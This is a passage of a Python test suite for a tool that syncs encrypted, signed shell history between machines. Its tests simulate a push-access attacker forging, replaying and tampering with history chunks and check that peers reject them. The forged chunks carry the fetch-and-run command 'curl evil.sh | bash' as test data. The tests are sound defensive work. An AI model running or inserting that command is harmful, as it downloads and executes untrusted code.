    def test_a_peer_refuses_what_a_revoked_machine_signs_afterwards(self) -> None:
        alpha, beta, gamma = self.fleet()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_001, "legitimate-beta-history")
            sync.run()
        with gamma.active():
            sync.run()
            self.assertIn("legitimate-beta-history", gamma.commands())

        self.revoke_beta(alpha, beta)
        self.publish_as_revoked(beta, "2023-11-15", 1_700_100_002, "after-the-revocation")

        with gamma.active():
            report = sync.run()
            self.assertIn(beta.id, report.unpinned)
            self.assertNotIn("after-the-revocation", gamma.commands())

    def test_it_cannot_publish_under_another_machines_id_either(self) -> None:
        """The cross-host version, and the one a shared key could never stop.

        beta writes into *alpha's* host directory, where alpha would never look
        -- `merge` skips your own id -- so only the other peers judge it. It can
        seal the chunk perfectly well; what it cannot do is sign as alpha.
        """
        alpha, beta, gamma = self.fleet()
        self.revoke_beta(alpha, beta)

        with beta.active():
            day = "2023-11-14"
            with sync.lock():
                sync._fetch_and_rebase(sync.read_repo())
                pub = store.day_key_public(alpha.id, day)
                entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "planted-under-alpha")
                sealed = crypto.encrypt_to(
                    sync.pack((format_line(entry) + "\n").encode("utf-8")),
                    pub.read_text(encoding="utf-8").strip(),
                )
                target = store.chunk_dir(alpha.id, day) / "9999999999-ffffff.age"
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(sealed)
                sync._commit()
                sync._push(sync.read_repo())

        with gamma.active():
            sync.run()
            self.assertNotIn("planted-under-alpha", gamma.commands())

    def test_a_replayed_manifest_from_before_the_revocation_is_refused_too(self) -> None:
        """beta keeps every manifest it signed; unpinning covers the old ones."""
        alpha, beta, gamma = self.fleet()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_001, "before-revocation")
            sync.run()
        self.revoke_beta(alpha, beta)

        with gamma.active():
            sync.run()  # sees the tombstone and drops the pin
            report = sync.run()
            self.assertNotIn(beta.id, sync.State.load().signers)
            self.assertIn(beta.id, report.untrusted)

    def test_trust_will_not_re_accept_a_revoked_machine(self) -> None:
        """Otherwise the withdrawal is a suggestion: whoever it was aimed at
        holds push access, so it could simply republish and be offered again."""
        alpha, beta, gamma = self.fleet()
        self.revoke_beta(alpha, beta)
        with gamma.active():
            sync.run()
            offered = [c.host_id for c in sync.trust_candidates()]
        self.assertNotIn(beta.id, offered)


class TestExportNeverSignsWhatItDidNotWrite(SyncTestCase):
    """`merge` skips this host's own id, so a chunk planted under it is the one
    thing nothing else ever inspects.

    If `export` built its manifest by listing the day's directory, an ordinary
    sync would sign that chunk and hand every peer something they believe --
    without even the `compact` run the old design needed. So the manifest is
    *extended* from the one this machine last signed, never rebuilt from disk.
    """

    def test_a_chunk_planted_under_our_own_id_is_never_signed(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()

            planted = store.chunk_dir(alpha.id, "2023-11-14") / "9999999999-ffffff.age"
            planted.write_bytes(b"whatever an attacker likes")

            alpha.record("2023-11-14", 1_700_000_002, "ours too")
            report = sync.run(now=1_900_000_000)

            listed = sync.read_manifest(
                alpha.id, "2023-11-14", crypto.signing_public(store.signing_key_file())
            )
            self.assertNotIn(planted.name, listed, "export signed a chunk it did not write")
            self.assertIn(f"2023-11-14/{planted.name}", report.foreign)

    def test_a_peer_refuses_the_planted_chunk(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
            entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "planted")
            pub = store.day_key_public(alpha.id, "2023-11-14").read_text(encoding="utf-8").strip()
            sealed = crypto.encrypt_to(sync.pack((format_line(entry) + "\n").encode("utf-8")), pub)
            (store.chunk_dir(alpha.id, "2023-11-14") / "9999999999-ffffff.age").write_bytes(sealed)
            alpha.record("2023-11-14", 1_700_000_002, "ours too")
            sync.run(now=1_900_000_000)

        with beta.active():
            sync.run()
            self.assertNotIn("planted", beta.commands())
            self.assertIn("ours too", beta.commands())


class TestFindReader(SyncTestCase):
    """Revocation is by fingerprint: the name is the part an attacker writes."""

    def test_a_full_fingerprint_selects_one_machine(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            other = alpha.append_recipient(name="old-laptop")
            self.assertEqual(sync.find_reader(crypto.fingerprint(other)).key, other)

    def test_an_unambiguous_prefix_is_enough(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            other = alpha.append_recipient(name="old-laptop")
            found = sync.find_reader(crypto.fingerprint(other)[:20])
        self.assertEqual(found.key, other)

    def test_an_ambiguous_prefix_is_refused_rather_than_resolved(self) -> None:
        # Guessing here removes somebody's access.
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.append_recipient(name="old-laptop")
            with self.assertRaises(sync.SyncError) as caught:
                sync.find_reader("age1")
        self.assertIn("matches 2 machines", str(caught.exception))

    def test_a_fingerprint_nobody_has_is_refused(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), self.assertRaises(sync.SyncError) as caught:
            sync.find_reader("SHA256:nothing-like-this")
        self.assertIn("no enrolled machine", str(caught.exception))


class TestRevokeConfirmation(SyncTestCase):
    def test_without_yes_and_without_a_terminal_nothing_changes(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")

        code, _ = self.run_cli(alpha, "revoke", crypto.fingerprint(gone))
        self.assertEqual(code, 1)
        with alpha.active():
            self.assertIn(gone, sync.recipients())

    def test_the_limits_are_stated_before_the_decision(self) -> None:
        """They are the reasons someone would answer no and go do something
        else first, so printing them after the fact is printing them too late.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")

        code, out = self.run_cli(alpha, "revoke", crypto.fingerprint(gone), "--yes")
        self.assertEqual(code, 0)
        self.assertIn("does not un-publish", out)
        self.assertIn("does not revoke git access", out)
        self.assertIn("nothing that machine publishes is accepted", out)
        with alpha.active():
            self.assertNotIn(gone, sync.recipients())


class TestGrantConfirmsAdditions(SyncTestCase):
    """A confirmation listing everything makes the one new line easy to miss."""

    def test_the_first_grant_reports_every_machine_as_new(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            self.assertTrue(all(reader.is_new for reader in sync.readers()))

    def test_granting_remembers_who_was_approved(self) -> None:
        alpha = self.machine("alpha")
        code, _ = self.run_cli(alpha, "grant", "--yes")
        self.assertEqual(code, 0)
        with alpha.active():
            self.assertFalse(any(reader.is_new for reader in sync.readers()))

    def test_a_grant_nobody_approved_does_not_silence_the_next_prompt(self) -> None:
        """Omitting `approved` means no human saw a list, so there was no
        decision to remember."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.grant()
            self.assertTrue(all(reader.is_new for reader in sync.readers()))

    def test_a_key_appended_afterwards_is_the_only_one_reported_as_new(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        self.run_cli(alpha, "grant", "--yes")

        # Exactly what push access alone buys: append a key labelled like one of
        # the machines that is already there.
        with alpha.active():
            forged = alpha.append_recipient(name="martin@laptop")
            new = [reader for reader in sync.readers() if reader.is_new]

        self.assertEqual([reader.key for reader in new], [forged])

    def test_a_new_key_is_put_to_the_human_even_with_a_familiar_name(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        self.run_cli(alpha, "grant", "--yes")
        with alpha.active():
            alpha.append_recipient(name="martin@laptop")

        code, out = self.run_cli(alpha, "grant", "--yes")
        self.assertEqual(code, 0)
        self.assertIn("1 machine(s) NOT yet granted", out)
        self.assertIn("SAME NAME AS ANOTHER KEY", out)

    def test_no_label_can_put_an_escape_sequence_on_the_prompt(self) -> None:
        """The second half of the defence, and independent of the first.

        `make_inert` handles C0; printing with `repr` covers what is left --
        anything Python calls unprintable, a bidi override among them -- and
        quotes the label so leading whitespace is visible rather than shifting
        the line it is on.
        """
        # U+202E flips the direction of everything after it, and is neither a
        # control character nor anything `make_inert` touches.
        hostile = "  martin@desktop\u202e"
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            alpha.append_recipient(name=hostile)

        _, out = self.run_cli(alpha, "grant", "--yes")
        self.assertIn("martin@desktop", out)
        self.assertNotIn(hostile, out)
        self.assertNotIn("\u202e", out)

    def test_re_sealing_to_an_unchanged_set_does_not_ask(self) -> None:
        """Nothing is widened, so there is nothing to consent to -- and a prompt
        that fires when there is nothing to decide is one people stop reading.

        Driven without `--yes` and without a terminal, which is exactly what the
        old code refused.
        """
        alpha = self.machine("alpha")
        self.run_cli(alpha, "grant", "--yes")

        code, out = self.run_cli(alpha, "grant")
        self.assertEqual(code, 0)
        self.assertIn("No machine is new", out)

    def test_a_new_machine_without_yes_and_without_a_terminal_is_refused(self) -> None:
        alpha = self.machine("alpha")
        self.run_cli(alpha, "grant", "--yes")
        with alpha.active():
            alpha.append_recipient(name="martin@desktop")

        code, _ = self.run_cli(alpha, "grant")
        self.assertEqual(code, 1)
        with alpha.active():
            self.assertTrue(any(reader.is_new for reader in sync.readers()))


class TestChunkNaming(support.WoswoarTestCase):
    def test_many_chunks_in_one_second_all_get_distinct_paths(self) -> None:
        """Overwriting a sealed chunk would destroy committed history.

        The name is `<epoch seconds>-<random>`, so everything written inside one
        second is competing for the same random suffix. With four hex characters
        and no check, twenty chunks collided in ~0.3% of runs -- which showed up
        exactly once in CI, as one missing chunk.
        """
        made: set[Path] = set()
        store.chunk_dir("host", "2023-11-14").mkdir(parents=True, exist_ok=True)
        for _ in range(2000):
            path = store.new_chunk("host", "2023-11-14", 1_700_000_000)
            self.assertNotIn(path, made)
            made.add(path)
            path.write_bytes(b"x")  # only an existing file can be collided with


class TestLayout(SyncTestCase):
    def test_a_chunk_lives_one_directory_below_its_host(self) -> None:
        """`hosts/<id>/2023-11-14/<chunk>` -- the date is one path component.

        Every commit rewrites a tree object per level it touches, so nesting
        the date as `2023/11/14` costs two extra objects on every sync forever.
        Pinned because it is invisible in behaviour and easy to reintroduce.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            chunk = next(iter(store.iter_chunks(alpha.id)))
            relpath = chunk.path.relative_to(store.history_dir()).as_posix()

        self.assertEqual(relpath.split("/")[:3], ["hosts", alpha.id, "2023-11-14"])
        self.assertTrue(store.is_chunk_path(relpath), relpath)

    def test_sealed_history_is_smaller_than_the_plaintext_it_carries(self) -> None:
        """A day's worth of one machine's commands, compacted into one chunk.

        Without compression the sealed form is strictly *larger* than the
        plaintext -- age adds a header and encrypts. This asserts the whole
        point of packing the payload first, on input shaped like real history.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            # Two syncs, not sixty: `compact` only needs more than one chunk to
            # merge, and each extra sync is a fetch, a rebase, a push and an
            # `age` spawn for no additional coverage.
            for i in range(60):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"git commit -m 'feature {i % 7}'")
                if i == 29:
                    sync.run()
            sync.run()
            plaintext = store.log_file(alpha.id, "2023-11-14").stat().st_size
            sync.compact(before="2023-11-15")
            sealed = sum(c.path.stat().st_size for c in store.iter_chunks(alpha.id))

        self.assertLess(sealed, plaintext // 2, f"sealed={sealed} plaintext={plaintext}")


class TestCompact(SyncTestCase):
    def test_compact_merges_chunks_and_preserves_content(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(5):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            before = len(list(store.iter_chunks(alpha.id)))
            self.assertEqual(before, 5)

            days, replaced, _ = sync.compact(before="2023-11-15")
            self.assertEqual((days, replaced), (1, 5))
            self.assertEqual(len(list(store.iter_chunks(alpha.id))), 1)

    def test_a_before_in_the_future_is_refused(self) -> None:
        """Issue #69: the only trigger that repeats indefinitely.

        `--before 2099-01-01` takes in today and every day after it, and those
        days keep gaining chunks -- so each is a day whose local copy peers must
        rebuild every time it grows. A day compacted while still being written
        reaches ~1440 chunks. There is no case where asking for it is the intent.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            # Two syncs, so the day has two chunks: compacting a day that holds
            # one is a no-op, and would prove nothing about the guard.
            for i, cmd in enumerate(("git status", "make -j8")):
                alpha.record("2023-11-14", 1_700_000_001 + i, cmd)
                sync.run()
            before = {c.name for c in store.iter_chunks(alpha.id)}

        with alpha.active():
            with self.assertRaises(sync.SyncError) as refused:
                sync.compact(before="2099-01-01")
            self.assertIn("in the future", str(refused.exception))
            self.assertEqual({c.name for c in store.iter_chunks(alpha.id)}, before)

            # A finished day is still fine, so the guard is on the future and
            # not on the flag.
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)

    def test_the_default_leaves_today_alone(self) -> None:
        """`compact()` with no argument means "days that are finished".

        Today is still being written, so compacting it produces exactly the day
        whose local copy every peer rebuilds each time it grows -- the case #69
        is about, reached without passing any flag at all.
        """
        alpha = self.machine("alpha")
        today = store.day_for(int(time.time()))
        with alpha.active():
            for i in range(2):
                alpha.record(today, 1_700_000_001 + i, f"today {i}")
                sync.run()
                alpha.record("2023-11-14", 1_700_000_001 + i, f"finished {i}")
                sync.run()
            live = {c.name for c in store.iter_chunks(alpha.id) if c.day == today}

            self.assertEqual(sync.compact()[0], 1, "the finished day was not compacted")
            self.assertEqual(
                {c.name for c in store.iter_chunks(alpha.id) if c.day == today},
                live,
                "the default compacted a day still being written",
            )

    def test_compacted_chunk_still_reaches_another_machine(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            for i in range(3):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            sync.compact(before="2023-11-15")
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"command 0", "command 1", "command 2"})


class TestIdentityStatus(SyncTestCase):
    """The health check `doctor` reports. Testable because it lives in sync."""

    def test_healthy_identity(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            status = sync.identity_status(store.machine())
            self.assertTrue(status.ok, status.detail)

    def test_missing_identity_file_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            known = store.machine()
            Path(known.identity).unlink()
            status = sync.identity_status(known)
            self.assertFalse(status.ok)
            self.assertIn("missing", status.detail)

    def test_unconfigured_identity_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            status = sync.identity_status(store.machine()._replace(identity=""))
            self.assertFalse(status.ok)
            self.assertIn("woswoar init", status.detail)

    def test_passphrase_protected_key_is_reported(self) -> None:
        # The failure that only bites unattended: age cannot use ssh-agent, so
        # this key would work by hand and never from a systemd timer.
        alpha = self.machine("alpha")
        with alpha.active():
            locked = self.root / "locked"
            subprocess.run(
                ["ssh-keygen", "-q", "-t", "ed25519", "-N", "hunter2", "-f", str(locked)],
                check=True,
                timeout=60,
            )
            status = sync.identity_status(store.machine()._replace(identity=str(locked)))
            self.assertFalse(status.ok)
            self.assertIn("passphrase", status.detail)


class TestLocalOnly(SyncTestCase):
    def test_sync_without_a_remote_still_seals(self) -> None:
        alpha = Fake(self.root, "solo")
        with alpha.active():
            sync.initialise(new_identity=True)
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertFalse(report.pushed)

    def test_concurrent_sync_is_refused_not_corrupted(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), sync.lock(), self.assertRaises(sync.SyncError):
            sync.run()


class TestSyncIsPrivate(SyncTestCase):
    def test_a_sync_that_runs_before_install_leaves_nothing_readable(self) -> None:
        """The timer can fire on a machine where `install` never ran.

        Everything sync creates on its own -- the data directory, the lock, the
        state file, a peer's learned name -- has to be owner-only by itself,
        because `install` is the only thing that re-tightens and it may never
        have run here.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            # The harness pre-creates WOSWOAR_DIR, which stands in for a user
            # pointing it at a directory that already existed -- woswoar leaves
            # those alone by design, so start from the state `install` leaves.
            store.harden()
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            exposed = store.readable_by_others()
            self.assertEqual(exposed, [], f"sync left {exposed} readable by others")


class TestASigningKeyThatChanges(SyncTestCase):
    """A machine that starts signing with a different key is never waved through.

    It is either a machine that was re-enrolled after losing its key, or someone
    rewriting the repo to publish as one of your machines. Nothing available to
    a peer can tell those apart, so the peer refuses and says so, and a human
    decides. Silently re-pinning would make the pin worthless: an attacker would
    just publish a new `signer.pub` alongside the history they wanted believed.
    """

    def test_losing_the_signing_key_mints_a_new_one_rather_than_stopping(self) -> None:
        # Recording and publishing must not depend on a file the user could
        # delete; the consequence lands on the peers, loudly, where it can be
        # judged.
        alpha = self.machine("alpha")
        with alpha.active():
            first = crypto.signing_public(store.signing_key_file())
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()

            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertNotEqual(crypto.signing_public(store.signing_key_file()), first)

    def test_a_peer_refuses_the_new_key_and_keeps_the_old_pin(self) -> None:
        alpha, beta = self.enrolled_pair()
        with alpha.active():
            pinned_before = sync.State.load().signers[alpha.id]
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()
            # A new day: days it already signed are frozen under the old key,
            # so publishing there would test nothing about the peer's refusal.
            alpha.record("2023-11-20", 1_700_500_002, "after-the-key-changed")
            self.assertEqual(sync.run(now=1_900_000_000).chunks_written, 1)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.changed_signer, {alpha.id})
            self.assertNotIn("after-the-key-changed", beta.commands())
            # The old pin survives: a refusal must not quietly become an update.
            self.assertEqual(sync.State.load().signers[alpha.id], pinned_before)

    def test_a_human_can_accept_the_new_key_and_history_flows_again(self) -> None:
        alpha, beta = self.enrolled_pair()
        with alpha.active():
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()
            # A *new* day. Days it already signed are frozen -- see below.
            alpha.record("2023-11-20", 1_700_500_002, "after-the-key-changed")
            sync.run(now=1_900_000_000)

        with beta.active():
            sync.run()
            code, _ = self.run_cli(beta, "trust", "--replace", "--yes")
            self.assertEqual(code, 0)
            sync.run()
            self.assertIn("after-the-key-changed", beta.commands())

    def test_days_it_already_signed_are_frozen_by_the_new_key(self) -> None:
        """A consequence worth being plain about rather than discovering.

        The old manifest was signed with the key that is gone, so this machine
        can no longer verify its own record of what it published that day.
        Signing a replacement would disown those chunks; refusing keeps them.
        New days are unaffected, so the machine is not stuck.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before the key changed")
            sync.run()
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()

            alpha.record("2023-11-14", 1_700_000_002, "same day, new key")
            alpha.record("2023-11-20", 1_700_500_002, "a fresh day")
            report = sync.run(now=1_900_000_000)

        self.assertEqual(report.unsignable, {"2023-11-14"})
        self.assertEqual(report.chunks_written, 1, "the fresh day should still publish")

    def enrolled_pair(self) -> tuple[Fake, Fake]:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
        return alpha, beta


class TestMergedHistoryIsStoredFaithfully(SyncTestCase):
    def test_a_peers_history_lands_verbatim_and_owner_only(self) -> None:
        """Merging must not decode-and-re-encode another machine's log.

        A command can hold bytes that are not valid UTF-8 -- a mistyped paste,
        a filename in another charset -- and the recording machine stored them
        verbatim. Passing them through a lossy decode to fit a text-mode helper
        would silently rewrite history that machine got right.
        """
        alpha = self.machine("alpha")
        raw = b"1700000001\ts1\t~\t0\t5\tgrep \xff\xfe binary\n"
        with alpha.active():
            path = store.log_file(alpha.id, "2023-11-14")
            with store.private_append(path, binary=True) as handle:
                handle.write(raw)
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            landed = store.log_file(alpha.id, "2023-11-14")
            merged = landed.read_bytes()
            mode = landed.stat().st_mode & 0o777
        self.assertEqual(merged, raw, "the peer's bytes were rewritten in transit")
        # Another machine's history is no less private than this machine's, and
        # it lands in the same tree -- so it is created with the same mode.
        self.assertEqual(mode & 0o077, 0, f"merged history landed {oct(mode)}")


class TestChunkAuthenticity(SyncTestCase):
    """Whether one of *this user's* machines wrote a chunk, which age cannot say.

    `recipients.txt` publishes every machine's public key and each day's public
    key sits in the clear beside its sealed half, so anyone who can push to the
    repo can seal a chunk every machine is able to *open*. These pin that being
    able to open it is not the same as being willing to believe it.
    """

    def push_as_attacker(self, write: Callable[[Path], None]) -> None:
        """Do what push access alone allows: no identity, no keys, just the repo."""
        work = self.root / "attacker"
        subprocess.run(
            ["git", "clone", "--quiet", str(self.origin), str(work)], check=True, timeout=60
        )
        write(work)
        for args in (
            ["add", "-A"],
            ["-c", "user.name=x", "-c", "user.email=x@y", "commit", "-q", "-m", COMMIT],
            ["push", "--quiet", "origin", "HEAD"],
        ):
            subprocess.run(["git", "-C", str(work), *args], check=True, timeout=60)

    @staticmethod
    def forged_chunk(
        work: Path,
        host_id: str,
        day: str,
        cmd: str,
        name: str = "9999999999-ffffff",
    ) -> None:
        """A chunk sealed to a host's *published* day key, but not authentic.

        Byte-for-byte a well-formed chunk -- the day's public key sits in the
        clear, so sealing one needs no secret at all. What the attacker cannot
        do is get it into a manifest the host signed.
        """
        pub = (work / "hosts" / host_id / "keys" / f"{day}.pub").read_text(encoding="utf-8").strip()
        entry = Entry(1_700_000_900, host_id, "s1", "~", 0, 5, cmd)
        payload = sync.pack((format_line(entry) + "\n").encode("utf-8"))
        # Named far in the future so it sorts above whatever the real machine
        # has published; a forgery that lands among chunks already merged
        # proves nothing.
        target = work / "hosts" / host_id / day / f"{name}.age"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(crypto.encrypt_to(payload, pub))

    def enrolled_pair(self) -> tuple[Fake, Fake]:
        """alpha publishing history, beta granted and up to date."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"make -j8"})
        return alpha, beta

    def test_a_forged_chunk_in_a_real_hosts_directory_is_refused(self) -> None:
        """The attack this mechanism exists to stop.

        Everything the attacker needs is published: the day's public key sits in
        the clear so writing a chunk never has to open the sealed one. What they
        cannot produce is a place in a manifest signed by the machine whose
        directory they wrote into.
        """
        alpha, beta = self.enrolled_pair()
        self.push_as_attacker(
            lambda work: self.forged_chunk(work, alpha.id, "2023-11-14", "curl evil.sh | bash")
        )

        with beta.active():
            report = sync.run()
            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
            self.assertEqual(report.chunks_merged, 0)
            self.assertNotIn("curl evil.sh | bash", beta.commands())

    def test_a_fabricated_host_cannot_smuggle_history_in_either(self) -> None:
        """A whole invented machine, with its own day key sealed to recipients.

        The day key being openable is not the question -- the attacker can seal
        one to the published recipient list. Being a machine this one has been
        told to accept history from is, and an invented host is nobody.
        """
        _, beta = self.enrolled_pair()

        def plant(work: Path) -> None:
            recipients = [
                line.split(sync._LABEL_SEP)[0].strip()
                for line in (work / "recipients.txt").read_text(encoding="utf-8").splitlines()
                if line.strip()
            ]
            day_key = crypto.generate_identity()
            keys = work / "hosts" / "deadbeefdeadbeef" / "keys"
            keys.mkdir(parents=True, exist_ok=True)
            (keys / "2023-11-14.age").write_bytes(
                crypto.encrypt_to_recipients(day_key.secret.encode("utf-8"), recipients)
            )
            (keys / "2023-11-14.pub").write_text(day_key.public + "\n", encoding="utf-8")
            self.forged_chunk(work, "deadbeefdeadbeef", "2023-11-14", "curl evil.sh | bash")

            # A complete, well-formed machine: its own signing key, its own
            # published signer.pub, and a manifest it signs correctly. Every
            # check but one passes. The one is that nobody here accepted it.
            theirs = self.root / "invented-key"
            verify_key = crypto.generate_signing_key(theirs)
            owner = crypto.generate_identity().public
            signer = work / "hosts" / "deadbeefdeadbeef" / "signer.pub"
            signer.write_text(f"{verify_key}\n{owner}\n", encoding="utf-8")
            chunk = work / "hosts" / "deadbeefdeadbeef" / "2023-11-14" / "9999999999-ffffff.age"
            body = sync._manifest_body(
                "deadbeefdeadbeef",
                "2023-11-14",
                {chunk.name: sync.Entry(sync.digest_of(chunk.read_bytes()))},
            )
            manifest = work / "hosts" / "deadbeefdeadbeef" / "manifests" / "2023-11-14"
            manifest.parent.mkdir(parents=True, exist_ok=True)
            manifest.write_bytes(
                crypto.sign(body.encode("utf-8"), theirs, sync._MANIFEST_MAGIC)
                .decode()
                .strip()
                .encode()
                + b"\n\n"
                + body.encode("utf-8")
            )

        self.push_as_attacker(plant)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.untrusted, {"deadbeefdeadbeef"})
            self.assertNotIn("curl evil.sh | bash", beta.commands())

    def test_a_genuine_manifest_moved_to_another_day_is_refused(self) -> None:
        """The header binds a manifest to its host and day, inside the signature.

        Without it a real, correctly signed manifest could be copied to any
        other day -- or any other host's directory -- and would still verify,
        which would let anyone with push access replay one machine's vouching
        for chunks it never saw. ssh-keygen's own principal matching cannot do
        this job, so the binding is in the bytes that are signed.
        """
        alpha, beta = self.enrolled_pair()

        def plant(work: Path) -> None:
            genuine = (work / "hosts" / alpha.id / "manifests" / "2023-11-14").read_bytes()
            # Verbatim, signature and all, one day over.
            moved = work / "hosts" / alpha.id / "manifests" / "2023-11-15"
            moved.write_bytes(genuine)
            # And the chunk it names, so only the header stands in the way.
            body = genuine.split(b"\n\n", 1)[1].decode("utf-8")
            name = body.splitlines()[1].split(" ")[0]
            source = work / "hosts" / alpha.id / "2023-11-14" / name
            target = work / "hosts" / alpha.id / "2023-11-15" / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(source.read_bytes())
            keys = work / "hosts" / alpha.id / "keys"
            for suffix in (".age", ".pub"):
                source_key = keys / f"2023-11-14{suffix}"
                (keys / f"2023-11-15{suffix}").write_bytes(source_key.read_bytes())

        self.push_as_attacker(plant)

        with beta.active():
            report = sync.run()
            self.assertIn(f"{alpha.id}/2023-11-15", report.unauthenticated)

    def test_tampering_with_an_authentic_chunk_is_refused(self) -> None:
        """Flipping bytes in a real chunk must not merely fail to decrypt."""
        alpha, beta = self.enrolled_pair()
        with alpha.active():
            before = {c.name for c in store.iter_chunks(alpha.id)}
            alpha.record("2023-11-14", 1_700_000_002, "cargo build")
            sync.run(now=2_000_000_000)
            fresh = ({c.name for c in store.iter_chunks(alpha.id)} - before).pop()

        def flip(work: Path) -> None:
            target = work / "hosts" / alpha.id / "2023-11-14" / fresh
            blob = bytearray(target.read_bytes())
            blob[-1] ^= 0xFF
            target.write_bytes(bytes(blob))

        self.push_as_attacker(flip)

        with beta.active():
            self.assertEqual(sync.run().unauthenticated, {f"{alpha.id}/2023-11-14"})

    def test_a_chunk_listed_by_the_wrong_signer_is_refused_like_an_unlisted_one(self) -> None:
        """ "No manifest" and "manifest signed by someone else" are one answer.

        Anything else is the downgrade: an attacker would simply pick whichever
        shape was treated more leniently. They can generate a signing key freely
        -- what they cannot do is make it the one this machine accepts for that
        host.
        """
        alpha, beta = self.enrolled_pair()

        def plant(work: Path) -> None:
            self.forged_chunk(work, alpha.id, "2023-11-14", "signed-by-a-stranger")
            chunk = work / "hosts" / alpha.id / "2023-11-14" / "9999999999-ffffff.age"
            theirs = self.root / "attacker-key"
            crypto.generate_signing_key(theirs)
            body = sync._manifest_body(
                alpha.id,
                "2023-11-14",
                {chunk.name: sync.Entry(sync.digest_of(chunk.read_bytes()))},
            )
            signature = crypto.sign(body.encode("utf-8"), theirs, sync._MANIFEST_MAGIC)
            manifest = work / "hosts" / alpha.id / "manifests" / "2023-11-14"
            manifest.parent.mkdir(parents=True, exist_ok=True)
            manifest.write_bytes(
                signature.decode("utf-8").strip().encode() + b"\n\n" + body.encode("utf-8")
            )

        self.push_as_attacker(plant)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
            self.assertNotIn("signed-by-a-stranger", beta.commands())

    def test_compact_refuses_to_launder_a_chunk_this_machine_did_not_write(self) -> None:
        """`merge` skips our own host id, so compaction is where this is caught.

        Compaction re-seals and re-signs whatever it merges, then deletes the
        originals -- so a chunk planted under our *own* id would come out
        carrying this machine's own signature, with the evidence gone.
        It has to refuse rather than launder.
        """
        alpha, _ = self.enrolled_pair()
        self.push_as_attacker(
            lambda work: self.forged_chunk(work, alpha.id, "2023-11-14", "planted-under-my-own-id")
        )

        with alpha.active():
            sync.run()  # pulls the planted chunk into alpha's own working tree
            with self.assertRaises(sync.SyncError) as caught:
                sync.compact(before="2023-11-15")
            self.assertIn("refusing to compact", str(caught.exception))
            # And it is still there, not silently dropped.
            self.assertTrue(list(store.iter_chunks(alpha.id)))


class TestExportWillNotDisownItsOwnHistory(SyncTestCase):
    """A day whose signed list this machine cannot verify is left alone.

    Signing a fresh manifest would drop every chunk published earlier that day
    out of the signed list, and peers would then refuse them -- so a file
    anybody with push access can corrupt would cost you published history.
    """

    def test_a_corrupted_own_manifest_stops_that_day_rather_than_truncating_it(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "published earlier")
            sync.run()
            before = sync.read_manifest(
                alpha.id, "2023-11-14", crypto.signing_public(store.signing_key_file())
            )
            self.assertEqual(len(before), 1)

